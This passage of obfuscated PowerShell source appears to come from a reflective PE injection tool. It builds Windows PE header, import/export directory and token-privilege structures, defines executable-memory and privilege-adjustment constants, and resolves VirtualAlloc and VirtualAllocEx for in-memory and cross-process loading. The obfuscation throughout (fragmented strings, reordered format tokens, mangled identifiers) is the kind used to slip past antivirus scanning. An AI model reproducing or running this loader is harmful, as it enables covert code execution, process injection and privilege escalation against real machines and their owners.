		${TY`peBuil`dER}.('DefineFie'+'l'+'d').Invoke(('e_'+'l'+("{1}{0}" -f'rlc','fa')), [UInt16], ('Pu'+("{1}{0}" -f 'ic','bl'))) | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
		${TyPe`BUil`DeR}.('Defin'+'eFiel'+'d').Invoke(('e_'+("{1}{0}" -f'no','ov')), [UInt16], (("{1}{0}"-f'l','Pub')+'i'+'c')) | &("{2}{0}{1}" -f 't','-Null','Ou')

		${e`_REsFi`e`ld} = ${TY`pEBuI`l`DEr}.('DefineFi'+'el'+'d').Invoke((("{0}{1}"-f 'e_r','e')+'s'), [UInt16[]], ('P'+("{1}{0}"-f ' ','ublic,')+'Ha'+("{1}{0}"-f 'e','sFi')+("{1}{0}"-f 'Ma','ld')+("{1}{0}" -f 'hal','rs')))
		${C`on`st`R`UCTOrVaLuE} = [System.Runtime.InteropServices.UnmanagedType]::"b`YvAlAr`RAY"
		${fiE`l`dAr`Ray} = @([System.Runtime.InteropServices.MarshalAsAttribute].('Get'+'Field').Invoke((("{1}{0}"-f'C','Size')+'on'+'st')))
		${attrIbbui`lD`Er} = &("{0}{1}{2}" -f'New','-Obje','ct') ('System.'+'Reflecti'+'o'+'n.'+'Emi'+'t.C'+'ustomAttributeBuil'+'der')(${coNStr`U`cTORIn`FO}, ${C`oNSt`RUCtORV`AlUE}, ${fIEL`d`ArRaY}, @([Int32] 4))
		${E`_r`eSFIeld}.('SetCust'+'omAt'+'tri'+'b'+'ute').Invoke(${AtTrib`B`U`I`LDeR})

		${t`yp`EBuILdEr}.('Def'+'ineFi'+'eld').Invoke(('e_o'+("{1}{0}"-f 'mid','e')), [UInt16], ('Pu'+("{1}{0}" -f'ic','bl'))) | &("{1}{0}{2}" -f't-N','Ou','ull')
		${typ`Ebu`ild`Er}.('D'+'e'+'fineFi'+'eld').Invoke((("{0}{1}" -f'e_o','emin')+'fo'), [UInt16], ('P'+("{1}{0}" -f 'ic','ubl'))) | &("{2}{0}{1}"-f'ut-N','ull','O')

		${E_res2FI`e`LD} = ${tY`PeB`Ui`ldeR}.('De'+'fineFiel'+'d').Invoke((("{0}{1}"-f 'e_r','es')+'2'), [UInt16[]], ('Pub'+'li'+'c,'+("{0}{1}{2}{3}"-f ' HasF','ie','ld','Ma')+("{1}{0}" -f 'shal','r')))
		${cO`N`st`RuCTO`Rv`AlUE} = [System.Runtime.InteropServices.UnmanagedType]::"BY`V`Al`ARRAY"
		${At`T`RiBBUIldeR} = &("{3}{0}{1}{2}"-f 'ew','-Obj','ect','N') ('Sy'+'stem'+'.Refle'+'cti'+'on'+'.'+'E'+'mit'+'.CustomAttrib'+'u'+'teB'+'uilder')(${cONsT`Ru`CtorI`NFo}, ${COnSTR`UctOR`Va`lUE}, ${fiE`l`DARRay}, @([Int32] 10))
		${E`_re`s`2fiElD}.('S'+'e'+'tC'+'ustom'+'Attribu'+'te').Invoke(${attRi`B`Build`Er})

		${TYPE`B`UILDeR}.('Def'+'ineFi'+'eld').Invoke(('e_l'+'f'+("{0}{1}" -f 'an','ew')), [Int32], (("{0}{1}" -f'P','ubl')+'ic')) | &("{1}{0}" -f 'ut-Null','O')
		${ImAGE_`dOs`_`h`eaDER} = ${T`Y`PEbUI`LdeR}.('Crea'+'te'+'Type').Invoke()	
		${w`iN32T`yP`eS} | &("{1}{3}{0}{2}" -f'M','Add','ember','-') -MemberType ('Not'+'ePrope'+'r'+'ty') -Name ('IMAGE_DOS_H'+'EADE'+'R') -Value ${I`maGe_D`Os_h`ea`DEr}

		
		${aT`TrI`BUTes} = ('Au'+("{2}{0}{1}"-f 'oL','ayo','t')+("{2}{1}{0}" -f ', Ans','t','u')+'iC'+'l'+'as'+'s'+','+' '+("{0}{1}"-f'Cl','ass, ')+'Pub'+("{0}{3}{2}{1}" -f'l',' Seque','c,','i')+("{2}{1}{0}" -f 'lL','tia','n')+'ay'+'o'+'ut'+','+("{0}{1}{2}"-f ' ','Sealed',',')+("{0}{1}"-f ' Be','f')+("{1}{0}" -f'reF','o')+'ie'+'ld'+'Ini'+'t')
		${TypEb`Ui`Ld`ER} = ${mOD`ULeb`UI`lDER}.('Defin'+'eTy'+'pe').Invoke(('I'+("{1}{0}" -f '_','MAGE')+("{1}{0}{2}"-f 'ION_','SECT','H')+("{0}{1}"-f'EA','DER')), ${at`TRIBu`Tes}, [System.ValueType], 40)

		${nAm`ef`ielD} = ${tYPEbu`il`d`er}.('Defi'+'neFiel'+'d').Invoke(('Nam'+'e'), [Char[]], (("{1}{0}" -f 'ublic','P')+("{2}{1}{0}" -f'i','sF',', Ha')+'e'+'l'+("{1}{2}{0}"-f 'rshal','dM','a')))
		${Co`Ns`TrUc`ToRVA`LUE} = [System.Runtime.InteropServices.UnmanagedType]::"bYvALaR`R`AY"
		${aTt`R`I`BbUiLd`eR} = &("{3}{1}{2}{0}" -f 'ct','w-O','bje','Ne') ('Sy'+'st'+'e'+'m.Re'+'fl'+'ect'+'i'+'o'+'n.Emit.Cu'+'stom'+'Attr'+'ibuteB'+'uild'+'er')(${C`on`STr`UC`TORInfO}, ${cON`StRUC`TOr`V`AlUE}, ${f`iEldA`Rr`AY}, @([Int32] 8))
		${n`AMEF`i`eLd}.('SetC'+'us'+'to'+'m'+'Attribute').Invoke(${attR`I`BBuI`lDeR})

		${Ty`p`EBUild`eR}.('D'+'efineFi'+'eld').Invoke((("{0}{2}{1}"-f 'Vi','ua','rt')+'lS'+'iz'+'e'), [UInt32], ('P'+("{0}{1}"-f 'u','bli')+'c')) | &("{2}{1}{0}" -f 'ull','t-N','Ou')
		${t`Yp`EBuILder}.('Defi'+'neFi'+'eld').Invoke((("{1}{0}" -f't','Vir')+'ua'+'lA'+("{1}{0}"-f'es','ddr')+'s'), [UInt32], ('Pub'+'lic')) | &("{0}{2}{1}" -f'Out','ll','-Nu')
		${ty`pe`BUildeR}.('D'+'e'+'fineFi'+'eld').Invoke(('S'+("{0}{1}" -f'i','zeOf')+("{1}{0}"-f'awD','R')+'ata'), [UInt32], (("{1}{0}" -f 'ubl','P')+'ic')) | &("{2}{1}{0}"-f 'l','-Nul','Out')
		${Ty`pEBUIL`dEr}.('D'+'efi'+'neFie'+'ld').Invoke(('P'+("{0}{1}{2}" -f 'oin','te','rT')+'o'+("{0}{1}"-f'Raw','D')+'ata'), [UInt32], (("{0}{1}"-f 'Publ','i')+'c')) | &("{1}{2}{0}" -f'Null','Out','-')
		${t`yPE`BUIlD`er}.('Defin'+'eF'+'ield').Invoke(('P'+("{2}{1}{0}" -f'el','oR','ointerT')+'oc'+("{1}{0}"-f'tio','a')+'ns'), [UInt32], ('P'+("{0}{1}"-f'u','blic'))) | &("{2}{1}{0}"-f 'l','ut-Nul','O')
		${T`yPeBu`Ilder}.('De'+'f'+'ineFie'+'ld').Invoke(('Poi'+'n'+'t'+("{1}{0}"-f'Lin','erTo')+("{1}{0}{2}"-f'mbe','enu','rs')), [UInt32], ('Pub'+'lic')) | &("{1}{2}{0}"-f 'll','Out-N','u')
		${tYP`EBUiLd`er}.('Defin'+'eFie'+'ld').Invoke(('Num'+("{1}{0}"-f'R','berOf')+'elo'+("{0}{2}{1}"-f'cati','s','on')), [UInt16], ('Pub'+'lic')) | &("{2}{1}{0}" -f'l','-Nul','Out')
		${T`YPEB`UILd`ER}.('De'+'fine'+'F'+'ield').Invoke((("{1}{0}" -f 'ber','Num')+'Of'+'Li'+("{0}{1}"-f 'nen','u')+("{1}{0}" -f'bers','m')), [UInt16], ('P'+'u'+("{1}{0}" -f'lic','b'))) | &("{2}{0}{1}"-f't-','Null','Ou')
		${T`Y`p`EBuiLDeR}.('De'+'fineFiel'+'d').Invoke(('Cha'+'ra'+("{0}{1}" -f'cte','r')+'is'+("{0}{1}" -f 't','ics')), [UInt32], (("{0}{1}" -f'Pu','bl')+'i'+'c')) | &("{1}{0}" -f't-Null','Ou')
		${ImAGE_S`ec`Tio`N_HeADeR} = ${t`yPebUi`lD`eR}.('Crea'+'teT'+'y'+'pe').Invoke()
		${WI`N3`2`Types} | &("{1}{2}{0}"-f 'ember','Add','-M') -MemberType ('Not'+'ePr'+'operty') -Name ('I'+'M'+'AG'+'E_'+'SEC'+'TION_HEADER') -Value ${Im`AGe`_Sec`TION_H`e`AdEr}

		
		${at`Tr`IbUTES} = (("{1}{0}{2}"-f 'toL','Au','ay')+("{0}{1}"-f 'ou','t,')+' '+'An'+("{2}{1}{0}{3}{4}"-f 'as','Cl','siClass, ','s, ','Pub')+("{1}{0}{2}" -f'c','li',', Seq')+'ue'+'nt'+'ial'+'L'+'a'+'yo'+("{0}{1}" -f 'ut, ','Sea')+("{1}{0}" -f 'd,','le')+("{0}{1}"-f' Befo','r')+'eF'+'i'+("{0}{1}" -f'eld','Init'))
		${typ`e`Bu`IlDeR} = ${mOD`U`le`BUi`ldEr}.('D'+'efineTyp'+'e').Invoke(('IM'+("{2}{3}{5}{4}{0}{1}"-f 'O','CAT','AGE_','BA','L','SE_RE')+'I'+'ON'), ${at`Tr`ibUtES}, [System.ValueType], 8)
		${tYPeB`UI`LdEr}.('Defi'+'n'+'e'+'Field').Invoke((("{1}{0}" -f'al','Virtu')+'Add'+'res'+'s'), [UInt32], ('P'+'ubl'+'ic')) | &("{2}{1}{0}"-f't-Null','u','O')
		${TyP`ebUI`l`deR}.('De'+'fine'+'Fi'+'eld').Invoke(('Siz'+'eO'+("{1}{0}" -f 'k','fBloc')), [UInt32], ('Pu'+'bl'+'ic')) | &("{2}{0}{1}"-f 'u','t-Null','O')
		${imAGe`_Ba`S`e_RElOca`TION} = ${Ty`P`eB`UiLDEr}.('Cr'+'e'+'ateT'+'ype').Invoke()
		${WiN`3`2tyPeS} | &("{2}{3}{1}{0}"-f'ember','M','Ad','d-') -MemberType ('NoteProp'+'e'+'rty') -Name ('IMAG'+'E_BA'+'SE'+'_REL'+'OC'+'AT'+'ION') -Value ${IMAge_`Bas`e_`RElOCAT`iOn}

		
		${A`TtrIb`Utes} = (("{1}{0}" -f'L','Auto')+'ay'+'ou'+("{0}{2}{1}"-f't,','as',' AnsiCl')+("{1}{2}{3}{0}"-f 'ass,','s',',',' Cl')+' P'+("{2}{1}{0}" -f ' ','blic,','u')+("{2}{0}{1}"-f 'e','ntialL','Sequ')+("{1}{0}"-f'ut','ayo')+("{0}{1}" -f ',',' Se')+'ale'+'d'+("{3}{1}{5}{4}{2}{0}"-f'it','e','FieldIn',', B','re','fo'))
		${T`yPEBUI`L`DER} = ${m`o`Du`LebuiL`DEr}.('Defin'+'eTy'+'pe').Invoke(('I'+'MA'+'G'+("{2}{1}{0}"-f'MPORT','I','E_')+("{0}{1}" -f'_DES','CRIP')+'T'+'OR'), ${a`T`TRiB`UtEs}, [System.ValueType], 20)
		${tY`p`ebUIl`DeR}.('Defi'+'neF'+'i'+'eld').Invoke((("{0}{1}" -f'Ch','ar')+("{0}{1}" -f 'act','eri')+'st'+'i'+'cs'), [UInt32], ('P'+'ubl'+'ic')) | &("{2}{0}{1}"-f 't-','Null','Ou')
		${TY`Pe`BuILD`eR}.('D'+'e'+'fineField').Invoke(('T'+("{1}{0}" -f'eS','imeDat')+("{0}{1}" -f 't','amp')), [UInt32], ('Pu'+("{0}{1}" -f 'b','lic'))) | &("{1}{0}" -f'll','Out-Nu')
		${t`yPEBU`iL`deR}.('D'+'e'+'fi'+'neField').Invoke((("{2}{0}{3}{1}"-f 'r','rCh','Forwa','de')+'ai'+'n'), [UInt32], (("{0}{1}"-f 'P','ubli')+'c')) | &("{1}{0}{2}"-f 'Nul','Out-','l')
		${T`YPE`BUI`LDer}.('D'+'efineF'+'i'+'eld').Invoke(('Na'+'me'), [UInt32], (("{0}{1}" -f 'Pu','bli')+'c')) | &("{1}{0}"-f 'ut-Null','O')
		${TyPeb`Uil`dER}.('D'+'efineFie'+'ld').Invoke(('F'+("{1}{0}"-f 'rstT','i')+("{1}{0}" -f 'nk','hu')), [UInt32], ('Pub'+'li'+'c')) | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
		${I`M`AGE`_ImpO`R`T_D`ESCRiPTor} = ${T`y`PebUI`lDeR}.('Cr'+'ea'+'teType').Invoke()
		${wIN`32TYP`ES} | &("{2}{0}{1}"-f 'd-Memb','er','Ad') -MemberType ('N'+'otePr'+'opert'+'y') -Name ('IM'+'AGE_IMP'+'OR'+'T_DE'+'S'+'CRI'+'PTOR') -Value ${iMaGe_`Im`port_`DeScR`iptOR}

		
		${aTtr`ib`UT`es} = ('Aut'+'o'+'Lay'+'o'+("{1}{0}{2}"-f 's','ut, An','i')+'C'+'la'+'ss,'+' C'+'l'+("{1}{2}{0}" -f' Pu','as','s,')+'bl'+("{1}{0}"-f ' Se','ic,')+("{1}{0}{2}"-f'uent','q','i')+'alL'+'ayo'+'ut,'+("{1}{2}{0}" -f', ',' ','Sealed')+'B'+'ef'+'or'+'eFi'+("{1}{0}" -f'dI','el')+'nit')
		${TYpe`B`UI`lDer} = ${Mo`duLeB`U`ILDER}.('Defin'+'eT'+'ype').Invoke((("{1}{0}" -f'AG','IM')+("{0}{1}{2}"-f 'E_','EXPORT_','DIRE')+'CT'+'OR'+'Y'), ${atTr`Ib`UTeS}, [System.ValueType], 40)
		${t`Y`PEbuilD`er}.('D'+'e'+'fineField').Invoke(('C'+'har'+'a'+'ct'+("{0}{1}{2}"-f 'er','istic','s')), [UInt32], (("{1}{0}" -f 'bl','Pu')+'ic')) | &("{2}{0}{1}"-f't-N','ull','Ou')
		${t`y`PEbuildEr}.('De'+'fineFi'+'eld').Invoke(('Tim'+("{1}{0}" -f 'teSt','eDa')+'am'+'p'), [UInt32], ('Pub'+'lic')) | &("{1}{0}" -f'l','Out-Nul')
		${tYP`Ebu`i`ldeR}.('Def'+'ineF'+'ield').Invoke(('Maj'+'or'+("{0}{2}{1}" -f 'Ve','n','rsio')), [UInt16], (("{1}{0}" -f 'bli','Pu')+'c')) | &("{0}{1}"-f'Out-N','ull')
		${T`YPE`BUI`LdEr}.('D'+'efi'+'neFie'+'ld').Invoke((("{0}{1}" -f 'Minor','Ver')+'s'+'io'+'n'), [UInt16], ('Pu'+'bl'+'ic')) | &("{2}{1}{0}"-f 'ull','N','Out-')
		${tyPEb`U`IL`DER}.('Defin'+'eF'+'ield').Invoke(('Na'+'me'), [UInt32], (("{1}{0}" -f 'ubl','P')+'ic')) | &("{0}{1}{2}"-f 'Out-Nu','l','l')
		${TYpEBu`iL`dEr}.('D'+'e'+'f'+'ineField').Invoke(('B'+'ase'), [UInt32], ('P'+("{1}{0}"-f 'bli','u')+'c')) | &("{2}{1}{0}" -f'l','Nul','Out-')
		${T`ypebu`iLDeR}.('D'+'efi'+'neField').Invoke(('N'+'um'+("{0}{1}{2}{3}"-f'berO','f','Fun','c')+'tio'+'ns'), [UInt32], (("{0}{1}"-f 'Pu','bl')+'i'+'c')) | &("{2}{0}{1}"-f't-Nul','l','Ou')
		${tYP`eb`UilDEr}.('Def'+'ine'+'Field').Invoke(('N'+("{1}{0}"-f'mbe','u')+("{1}{0}"-f'fNam','rO')+'es'), [UInt32], (("{0}{1}"-f'P','ubl')+'i'+'c')) | &("{0}{1}{2}" -f 'Out-','N','ull')
		${Typ`EbUiLD`er}.('D'+'efine'+'Fie'+'ld').Invoke(('A'+("{0}{1}" -f'dd','re')+("{1}{0}" -f 'F','ssOf')+("{0}{1}" -f 'uncti','ons')), [UInt32], ('Pub'+'lic')) | &("{2}{0}{1}"-f'ut-Nul','l','O')
		${T`YpeB`UI`ldER}.('Def'+'in'+'eFi'+'eld').Invoke(('Ad'+'d'+("{0}{1}"-f'ress','OfN')+("{1}{0}"-f 'es','am')), [UInt32], (("{0}{1}" -f 'Pub','li')+'c')) | &("{1}{2}{0}" -f'll','Out','-Nu')
		${TYP`eBU`ildeR}.('Define'+'Fi'+'el'+'d').Invoke(('Ad'+("{1}{0}" -f 'es','dr')+("{0}{1}"-f 's','OfN')+'a'+'me'+'Or'+("{0}{1}" -f'd','inals')), [UInt32], ('Pu'+'bl'+'ic')) | &("{0}{2}{1}" -f 'Ou','Null','t-')
		${IMAgE_`E`Xpo`R`T_DiReCt`ory} = ${T`YP`Ebuil`DeR}.('Crea'+'te'+'Type').Invoke()
		${W`I`N32`TYpeS} | &("{0}{1}{2}" -f'Add','-Membe','r') -MemberType ('Note'+'Pr'+'oper'+'ty') -Name ('IM'+'AGE_EXPO'+'RT_'+'DIRECTO'+'RY') -Value ${iM`Ag`E_eX`PO`Rt_`DIrecTORy}
		
		
		${A`T`TRibUtEs} = ('Aut'+("{1}{2}{0}" -f 'yout, ','o','La')+'A'+("{1}{0}" -f'siC','n')+'l'+'a'+("{2}{1}{0}"-f 'Cla','s, ','s')+'ss'+', '+'Pub'+'l'+'ic,'+("{0}{1}" -f' Seq','u')+'e'+("{1}{0}" -f 'alL','nti')+("{0}{1}" -f'ayou','t')+','+("{1}{0}" -f 'Seal',' ')+("{2}{3}{0}{4}{1}"-f'r','el','ed, ','Befo','eFi')+'dI'+'nit')
		${T`ypEbuI`ld`er} = ${M`ODu`Leb`UILDER}.('D'+'e'+'fineType').Invoke(('L'+'UID'), ${AttrIB`UT`Es}, [System.ValueType], 8)
		${Typeb`UIl`DeR}.('Def'+'ineFie'+'ld').Invoke((("{0}{1}" -f 'Lo','wP')+'a'+'rt'), [UInt32], ('Pu'+("{0}{1}" -f 'bli','c'))) | &("{1}{0}" -f 'ut-Null','O')
		${tYPe`BU`ILder}.('DefineFi'+'e'+'l'+'d').Invoke(('H'+'igh'+("{0}{1}" -f'Par','t')), [UInt32], ('P'+'ub'+'lic')) | &("{0}{1}" -f'O','ut-Null')
		${L`Uid} = ${tYPEB`UI`Ld`eR}.('Creat'+'e'+'T'+'ype').Invoke()
		${win3`2T`YPES} | &("{2}{0}{1}" -f 'Me','mber','Add-') -MemberType ('NotePr'+'ope'+'rt'+'y') -Name ('LU'+'ID') -Value ${L`Uid}
		
		
		${a`TtR`i`BUtEs} = (("{0}{1}"-f 'AutoL','ayo')+("{2}{1}{0}" -f'siClass','An','ut, ')+','+("{1}{0}"-f 'ss,',' Cla')+("{1}{0}"-f 'blic',' Pu')+', '+'S'+'e'+("{1}{0}"-f'a','quenti')+'l'+'L'+("{1}{0}" -f'yout','a')+', S'+'e'+("{1}{0}"-f 'ed','al')+', B'+'efo'+'r'+'e'+("{0}{1}"-f'F','iel')+("{0}{1}" -f'dIni','t'))
		${tYp`eBu`ILD`eR} = ${MOduL`EBu`I`lDER}.('D'+'efineTy'+'pe').Invoke(('LU'+'I'+("{0}{1}"-f 'D_A','N')+'D_A'+("{1}{0}" -f 'TRIBUTES','T')), ${atT`R`ibut`es}, [System.ValueType], 12)
		${tYPEBU`I`Lder}.('Def'+'ineF'+'ield').Invoke(('Lui'+'d'), ${lu`id}, ('Pub'+'lic')) | &("{0}{1}{2}"-f 'O','ut-Nu','ll')
		${ty`Pe`Bu`ILDEr}.('Def'+'ine'+'Field').Invoke((("{1}{0}" -f 'bu','Attri')+'te'+'s'), [UInt32], ('Pu'+("{0}{1}" -f'bl','ic'))) | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
		${luID`_`AnD_at`TRI`Bu`TeS} = ${T`Yp`eBuIlDER}.('C'+'rea'+'teType').Invoke()
		${wI`N`32tYpES} | &("{2}{1}{0}"-f 'r','d-Membe','Ad') -MemberType ('Note'+'Propert'+'y') -Name ('L'+'UID'+'_AND_A'+'TTRIBUTES') -Value ${Lu`id_and`_at`TR`I`BU`TEs}
		
		
		${a`TT`Ri`BUTes} = ('A'+'u'+'t'+'oLa'+("{0}{1}"-f 'yo','ut')+', A'+'ns'+("{0}{1}{2}" -f'iCla','ss, ','C')+'la'+'ss'+("{0}{1}"-f ', Pu','b')+("{1}{2}{0}" -f 't','lic, Seque','n')+'ia'+'lLa'+("{1}{0}{2}"-f'ut, ','yo','S')+'ea'+'led'+', '+'B'+'e'+'for'+("{0}{2}{1}" -f'eFiel','nit','dI'))
		${TYPE`BuI`Ld`eR} = ${MOD`ULeb`Ui`LDer}.('D'+'ef'+'ineType').Invoke(('TO'+("{1}{0}" -f 'PRI','KEN_')+("{2}{1}{0}"-f 'E','ILEG','V')+'S'), ${A`TtRI`BUteS}, [System.ValueType], 16)
		${ty`P`eBUILDEr}.('D'+'efi'+'neField').Invoke(('Pri'+("{1}{0}"-f 'leg','vi')+'e'+("{1}{0}"-f 'ount','C')), [UInt32], (("{0}{1}" -f'Pu','bl')+'ic')) | &("{2}{1}{0}" -f 'll','-Nu','Out')
		${tY`pEbu`il`deR}.('D'+'ef'+'ineField').Invoke((("{1}{0}"-f 'e','Privil')+'ge'+'s'), ${LUId`_an`d_At`TR`IButEs}, ('Pu'+("{0}{1}"-f'bl','ic'))) | &("{1}{2}{0}"-f'-Null','Ou','t')
		${tOkEn`_pri`ViLE`G`ES} = ${tyPeb`UI`l`Der}.('Cre'+'ateTy'+'pe').Invoke()
		${w`iN`32T`ypeS} | &("{0}{1}{2}{3}"-f 'Ad','d-Me','mb','er') -MemberType ('Not'+'ePrope'+'rty') -Name ('TOKEN_PR'+'I'+'VIL'+'EGES') -Value ${tOkEn`_`p`Ri`ViLegES}

		return ${wiN32t`y`PeS}
	}

	Function gET-w`i`N`3`2cONstAnTs
	{
		${Wi`N32`ConSTan`Ts} = &("{0}{2}{1}{3}" -f'New-O','ec','bj','t') ('Sys'+'t'+'em.O'+'bject')
		
		${w`i`N32c`onsTAnts} | &("{1}{2}{0}"-f'r','Ad','d-Membe') -MemberType ('N'+'oteP'+'roperty') -Name ('MEM_'+'COMMI'+'T') -Value 0x00001000
		${wi`N32CONS`TAnts} | &("{2}{0}{1}"-f'd-M','ember','Ad') -MemberType ('Not'+'eProp'+'erty') -Name ('MEM'+'_RESE'+'RV'+'E') -Value 0x00002000
		${wi`N32`CONst`ANtS} | &("{3}{0}{2}{1}"-f'-Me','er','mb','Add') -MemberType ('No'+'t'+'eProp'+'erty') -Name ('PA'+'GE_N'+'OACCESS') -Value 0x01
		${wIN`32`COnSta`NTS} | &("{1}{2}{0}{3}"-f'emb','A','dd-M','er') -MemberType ('NoteP'+'r'+'oper'+'ty') -Name ('PA'+'GE_READ'+'ONLY') -Value 0x02
		${wiN32`ConsT`Ants} | &("{0}{1}{2}" -f 'A','dd-Mem','ber') -MemberType ('N'+'oteP'+'ro'+'perty') -Name ('PAGE_RE'+'AD'+'W'+'RITE') -Value 0x04
		${w`In32`CoN`STaNTS} | &("{2}{0}{1}"-f '-Membe','r','Add') -MemberType ('NoteP'+'r'+'o'+'perty') -Name ('PAGE'+'_'+'WRI'+'TECO'+'PY') -Value 0x08
		${wIN32cO`Nst`AN`TS} | &("{2}{0}{1}" -f 'd-M','ember','Ad') -MemberType ('No'+'tePr'+'opert'+'y') -Name ('PAGE'+'_EXE'+'CUTE') -Value 0x10
		${w`In32`con`sTanTS} | &("{0}{1}{2}" -f 'Add-','Mem','ber') -MemberType ('Note'+'Pr'+'oper'+'ty') -Name ('P'+'AGE_E'+'XECUT'+'E_READ') -Value 0x20
		${Win`32COn`sTA`NtS} | &("{2}{0}{1}"-f '-M','ember','Add') -MemberType ('Note'+'P'+'roperty') -Name ('PA'+'GE'+'_EXECUTE_'+'READWR'+'ITE') -Value 0x40
		${Win32cO`Ns`TA`N`Ts} | &("{1}{2}{0}" -f'ember','A','dd-M') -MemberType ('N'+'oteProp'+'e'+'rty') -Name ('PAG'+'E_EXECUTE'+'_WRIT'+'E'+'COPY') -Value 0x80
		${wIn32`CoNs`TAn`TS} | &("{1}{2}{0}"-f'Member','A','dd-') -MemberType ('N'+'ot'+'ePr'+'operty') -Name ('PAGE_NOCA'+'CH'+'E') -Value 0x200
		${wiN3`2CoN`StAnts} | &("{2}{0}{1}" -f'-M','ember','Add') -MemberType ('Not'+'ePro'+'pert'+'y') -Name ('IMAGE'+'_REL'+'_'+'B'+'A'+'SED_ABSO'+'LUTE') -Value 0
		${Win32Co`NS`TANtS} | &("{1}{2}{0}" -f'er','A','dd-Memb') -MemberType ('NotePr'+'ope'+'rty') -Name ('IM'+'AGE_'+'REL_'+'BASED_HI'+'GH'+'LOW') -Value 3
		${wI`N`32co`NStaN`Ts} | &("{2}{1}{0}" -f 'er','emb','Add-M') -MemberType ('NotePrope'+'r'+'ty') -Name ('IMAGE_'+'RE'+'L'+'_BAS'+'ED_DI'+'R'+'64') -Value 10
		${Win32C`ON`St`ANTS} | &("{1}{2}{0}"-f'mber','Add-M','e') -MemberType ('NotePr'+'op'+'erty') -Name ('IM'+'A'+'GE_SC'+'N_MEM_DISCARD'+'A'+'BLE') -Value 0x02000000
		${wIN32`CONs`TAn`Ts} | &("{3}{1}{0}{2}" -f'm','Me','ber','Add-') -MemberType ('No'+'t'+'ePropert'+'y') -Name ('IMAGE_SCN'+'_M'+'EM_EXE'+'C'+'U'+'TE') -Value 0x20000000
		${wIn32C`ONSTA`N`TS} | &("{3}{1}{2}{0}" -f'mber','-M','e','Add') -MemberType ('N'+'oteProp'+'e'+'rty') -Name ('IM'+'AGE_SCN_'+'MEM_'+'REA'+'D') -Value 0x40000000
		${W`i`N3`2CoNstaN`TS} | &("{0}{2}{1}" -f'Add-Mem','er','b') -MemberType ('NoteP'+'roper'+'ty') -Name ('IMA'+'GE_SCN_'+'ME'+'M'+'_WRITE') -Value 0x80000000
		${wi`N`32Con`StaNTs} | &("{2}{0}{1}" -f'-Memb','er','Add') -MemberType ('Note'+'Propert'+'y') -Name ('IM'+'AG'+'E_'+'SCN_'+'M'+'EM'+'_NOT_CACHE'+'D') -Value 0x04000000
		${wi`N3`2C`ONS`TaNTs} | &("{0}{1}{3}{2}" -f'Add-Me','mb','r','e') -MemberType ('N'+'oteProp'+'e'+'rty') -Name ('ME'+'M_DECO'+'MMIT') -Value 0x4000
		${win`32coN`STan`TS} | &("{0}{2}{1}"-f'Add-M','r','embe') -MemberType ('N'+'ote'+'Prope'+'rty') -Name ('IMAGE'+'_F'+'I'+'LE_E'+'XEC'+'UT'+'A'+'BL'+'E_IMAGE') -Value 0x0002
		${wIn`3`2CONSTa`NTs} | &("{2}{1}{0}" -f'Member','dd-','A') -MemberType ('No'+'tePro'+'p'+'erty') -Name ('IM'+'AGE_FI'+'LE_'+'DLL') -Value 0x2000
		${wi`N3`2C`ons`TANtS} | &("{2}{0}{3}{1}" -f 'd','mber','Ad','-Me') -MemberType ('NotePro'+'pe'+'rty') -Name ('IMA'+'GE'+'_'+'DL'+'LCH'+'ARACTERISTI'+'CS_D'+'YNAMIC_BASE') -Value 0x40
		${W`IN`32coN`s`TAnts} | &("{1}{0}{2}"-f'Me','Add-','mber') -MemberType ('Not'+'ePro'+'perty') -Name ('I'+'MA'+'GE'+'_DLLCH'+'ARA'+'CTE'+'RI'+'STI'+'CS_NX_COMPAT') -Value 0x100
		${WiN`32CONSt`A`NtS} | &("{0}{2}{1}"-f'Add-','ember','M') -MemberType ('Not'+'ePro'+'perty') -Name ('MEM_R'+'EL'+'EASE') -Value 0x8000
		${WIn`32`coNsTA`NTs} | &("{0}{1}{2}"-f 'Add-Me','mb','er') -MemberType ('No'+'tePro'+'perty') -Name ('TOKEN_'+'Q'+'UER'+'Y') -Value 0x0008
		${WIn`3`2c`oN`sTants} | &("{0}{2}{1}"-f 'Add','mber','-Me') -MemberType ('N'+'otePro'+'p'+'erty') -Name ('TOKEN_A'+'DJ'+'UST_PR'+'IVI'+'L'+'EG'+'ES') -Value 0x0020
		${wIN32C`O`NsT`AN`TS} | &("{2}{1}{0}" -f'Member','dd-','A') -MemberType ('NotePr'+'ope'+'r'+'ty') -Name ('SE_PRIVILEG'+'E_ENA'+'BL'+'ED') -Value 0x2
		${wIN3`2`CONsTAn`Ts} | &("{0}{2}{3}{1}"-f'Add-','r','Me','mbe') -MemberType ('Note'+'Prop'+'erty') -Name ('ERROR'+'_NO_TOK'+'EN') -Value 0x3f0
		
		return ${wIN3`2c`onS`TANTs}
	}

	Function g`et-`Win3`2fU`NctioNs
	{
		${Wi`N32Fun`C`TiONs} = &("{1}{2}{0}" -f 't','New-','Objec') ('S'+'ys'+'tem'+'.Object')
		
		${v`iRtu`ALAllocAd`Dr} = &("{0}{4}{1}{3}{2}" -f'Get','ocA','ss','ddre','-Pr') ('ker'+'nel32.'+'dl'+'l') ('Virt'+'ualA'+'ll'+'oc')
		${VIrTUa`La`Ll`Oc`DelEGa`Te} = &("{1}{0}{3}{2}" -f'g','Get-Dele','Type','ate') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${virt`UALA`L`lOC} = [System.Runtime.InteropServices.Marshal]::('Get'+'DelegateFo'+'rFun'+'cti'+'on'+'Po'+'inter').Invoke(${ViRt`U`A`LAllocA`dDR}, ${VIr`Tua`lALloCd`ElEga`Te})
		${wI`N`32FuNCT`IONS} | &("{3}{0}{2}{1}" -f'-Mem','er','b','Add') ('Not'+'ePro'+'p'+'erty') -Name ('Virtua'+'lA'+'ll'+'oc') -Value ${vIRtU`A`LA`LL`OC}
		
		${VIRt`Ua`laLlOce`X`A`ddr} = &("{2}{1}{3}{4}{0}" -f'Address','t-','Ge','P','roc') ('ke'+'r'+'ne'+'l32.dll') ('Vi'+'rtualAl'+'l'+'ocEx')
		${ViR`T`UA`LaL`L`OcE`xD`eLeGAte} = &("{0}{2}{1}{4}{3}" -f 'Get-D','y','elegateT','e','p') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
